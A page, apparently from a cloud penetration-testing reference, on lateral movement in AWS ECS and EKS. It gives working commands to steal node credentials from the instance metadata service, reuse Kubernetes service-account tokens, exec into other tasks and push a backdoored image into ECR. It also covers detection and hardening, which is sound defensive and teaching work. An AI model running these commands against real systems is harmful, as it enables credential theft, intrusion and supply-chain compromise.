---
cstg_id: CSTG-AWS-ECS-EKS-LATERAL
title: "AWS Ecs Eks - Lateral Movement"
provider: aws
service: ecs-eks
phase: lateral-movement
required_access: assumed-breach
required_permissions:
  - ecs:ExecuteCommand
  - ecs:UpdateService
  - ecs:RegisterTaskDefinition
  - ecr:PutImage
  - ecr:InitiateLayerUpload
  - ecr:BatchGetImage
  - eks:DescribeCluster
  - sts:AssumeRole
  - ssm:StartSession
tools:
  - aws-cli
  - kubectl
  - peirates
  - kubeletctl
  - docker
  - amazon-ssm-agent
references:
  - "https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v4.html"
  - "https://docs.aws.amazon.com/eks/latest/userguide/pod-execution-role.html"
  - "https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html"
  - "https://docs.aws.amazon.com/AmazonECR/latest/userguide/registry-permissions.html"
  - "https://hackingthe.cloud/aws/exploitation/ecs_takeover/"
  - "https://kubernetes.io/docs/reference/access-authn-authz/rbac/"
license: CC BY-SA 4.0
---

## Summary

Lateral movement in a containerized AWS estate means traversing between peer workloads, between the container and its host node, between Kubernetes namespaces, and between AWS accounts — using credentials and access already obtained, without necessarily escalating privilege. Container platforms create unusually rich lateral surface: every running task or pod is a potential pivot carrying its own IAM identity (task role, IRSA/Pod Identity), nodes carry instance-profile roles reachable through IMDS, shared registries (ECR) bridge accounts, and the Kubernetes API is a flat network of services if RBAC and network policy are weak.

The attacker objective in this phase is breadth: reach additional containers, additional nodes, additional namespaces, and additional AWS accounts from an initial foothold. This page assumes the reader has already landed code execution in one container or holds one set of workload credentials (see [enumeration](../02-services/aws-ecs-eks-enum.md) and [privilege escalation](../03-privilege-escalation/aws-ecs-eks-privesc.md)).

## Prerequisites

- Code execution inside a container (ECS task or EKS pod), or a workload credential/token harvested from one.
- Or AWS API access with one or more of the permissions listed above.
- Network reachability between the foothold and the lateral targets (other pods, the node, IMDS, the API server, peered VPCs).

## Enumeration

```bash
# From inside a container - identify reachable neighbors and metadata
curl -s 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI   # ECS task creds
curl -s http://169.254.169.254/latest/meta-data/               # node IMDS (if reachable)
env                                                            # injected secrets

# Kubernetes neighbors and reachable services
kubectl get pods -A -o wide
kubectl get svc -A
kubectl get endpoints -A

# ECR cross-account reach
aws ecr describe-repositories
aws ecr get-repository-policy --repository-name <repo>

# STS targets the current creds can assume
aws iam list-roles --query "Roles[?AssumeRolePolicyDocument.Statement[?Action=='sts:AssumeRole']].Arn" 2>/dev/null
```

## Misconfigurations & Findings

- **Node IMDS reachable from pods/tasks** — any compromised workload can steal the node instance-profile role, which typically grants ECR pull, CloudWatch, and (on EKS) `system:nodes` capabilities. The single most common lateral primitive.
- **Flat pod networking with no NetworkPolicy** — a compromised pod can reach every other pod and every cluster service directly.
- **`automountServiceAccountToken: true`** on pods — exposes a Kubernetes token usable to call the API as that service account from any compromised pod.
- **Cross-account ECR pull/push grants** — enable poisoning images that other accounts deploy (supply-chain lateral movement) or pulling private images from a peer account.
- **Shared task/pod execution roles across services** — compromising one workload yields credentials usable against resources owned by others.
- **ECS Exec / SSM Session Manager broadly permitted** — interactive movement into any task.
- **kubelet read/write API exposed** (port 10250) without authn — direct `exec` into pods on a node, bypassing the API server.

## Exploitation

### Container-to-node: steal the node instance role

If IMDS is reachable from the workload, harvest the node's role and use it from anywhere:

```bash
# inside the pod/task
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 300")
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
```

The node role on EKS belongs to `system:nodes`, allowing reads of resources scheduled to that node and ECR pulls; on ECS EC2 launch type it carries the container-instance role.

### Pod-to-pod / namespace traversal via service account tokens

```bash
# Token mounted into every pod by default
cat /var/run/secrets/kubernetes.io/serviceaccount/token
APISERVER=https://kubernetes.default.svc
# Use it to query/act in other namespaces if RBAC permits
curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  $APISERVER/api/v1/namespaces/<other-ns>/pods
```

With sufficient RBAC, schedule or `exec` into pods in other namespaces to spread.

### ecs:ExecuteCommand / ssm:StartSession — move into other tasks

```bash
aws ecs execute-command --cluster <cluster> --task <other-task> \
  --container <name> --interactive --command "/bin/sh"
```

Each container reached this way yields its own task-role credentials, expanding the IAM footprint.

### ecs:UpdateService + ecs:RegisterTaskDefinition — implant a pivot sidecar

Update a service to a new task definition revision that adds an attacker-controlled sidecar container sharing the task's network/volumes, giving persistent code execution alongside legitimate workloads and access to their task role.

### ECR image poisoning (cross-account supply chain)

With push rights (`ecr:PutImage`, `ecr:InitiateLayerUpload`, etc.) to a repository that other services or accounts deploy from, overwrite a tag with a backdoored image. When the downstream service redeploys, the attacker gains execution in that environment.

```bash
aws ecr get-login-password --region <region> | \
  docker login --username AWS --password-stdin <acct>.dkr.ecr.<region>.amazonaws.com
docker tag malicious <acct>.dkr.ecr.<region>.amazonaws.com/<repo>:<tag>
docker push <acct>.dkr.ecr.<region>.amazonaws.com/<repo>:<tag>
```

### sts:AssumeRole — cross-account hop

Harvested task-role/IRSA credentials frequently permit assuming roles in other accounts (org-trust patterns). Enumerate and chain:

```bash
aws sts assume-role --role-arn arn:aws:iam::<other-acct>:role/<cross-role> \
  --role-session-name lat
```

### IRSA / Pod Identity reuse

Credentials exposed to a pod via IRSA (the `AWS_WEB_IDENTITY_TOKEN_FILE` + `AWS_ROLE_ARN` env, exchanged through `sts:AssumeRoleWithWebIdentity`) or via the Pod Identity agent are valid anywhere the role's policies and trust allow — export them and operate from outside the cluster.

### kubelet pivot (port 10250)

If a node's kubelet API is reachable and unauthenticated, run commands in any pod on that node without touching the API server (`kubeletctl exec`), bypassing audit logging and RBAC.

## Detection & Logging

- **CloudTrail:** `ecs:ExecuteCommand`, `ssm:StartSession`, `ecs:UpdateService`/`RegisterTaskDefinition` (sidecar implant), `ecr:PutImage`/`InitiateLayerUpload` (image push), and `sts:AssumeRole`/`AssumeRoleWithWebIdentity` chains across accounts are the key signals. Cross-account `AssumeRole` from a workload session name is notable.
- **EKS audit log:** API calls authenticated by a service account token from an unexpected pod/namespace, `pods/exec` events, and cross-namespace reads indicate token reuse.
- **IMDS access from containers:** credential retrievals for a node role used from an IP outside the node, or unusual `GetCallerIdentity` patterns, reveal stolen instance credentials. GuardDuty `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration*` and EKS runtime findings cover several of these.
- **ECR:** `PutImage` overwriting an existing tag from an unusual principal is a strong supply-chain indicator.

## Remediation & Hardening

- Block pod/task access to IMDS: enforce IMDSv2 with hop limit 1 and apply a NetworkPolicy or `--no-assign` of instance metadata to the `169.254.169.254` route for pods.
- Apply default-deny NetworkPolicies and segment namespaces; do not rely on flat pod networking.
- Set `automountServiceAccountToken: false` by default; use short-lived projected tokens with audiences.
- Disable or tightly scope ECS Exec and SSM Session Manager; require session logging.
- Lock ECR repository/registry policies to specific accounts; enable tag immutability and image scanning; require signed images.
- Add `sts:ExternalId`/condition keys and minimize cross-account trust on workload roles; scope IRSA role trust to specific service accounts (`sub` condition).
- Disable anonymous kubelet auth (`--anonymous-auth=false`) and restrict node port 10250 with security groups.
- Use distinct, least-privilege task/pod roles per workload — never share one role across services.

## Tools

- `aws-cli` — STS chaining, ECS Exec, ECR push, SSM sessions.
- `kubectl` — cross-namespace and pod-to-pod movement.
- `peirates` — automates service-account token theft, IMDS abuse, and pod pivots in EKS.
- `kubeletctl` — exploits exposed kubelet APIs for node-local lateral movement.
- `docker` — builds and pushes poisoned ECR images.
- `amazon-ssm-agent` — underlies ECS Exec / Session Manager interactive access.

## References

- ECS task metadata endpoint v4 — https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v4.html
- EKS pod execution role — https://docs.aws.amazon.com/eks/latest/userguide/pod-execution-role.html
- IAM roles for service accounts — https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html
- ECR registry permissions — https://docs.aws.amazon.com/AmazonECR/latest/userguide/registry-permissions.html
- ECS takeover — https://hackingthe.cloud/aws/exploitation/ecs_takeover/
- Kubernetes RBAC — https://kubernetes.io/docs/reference/access-authn-authz/rbac/
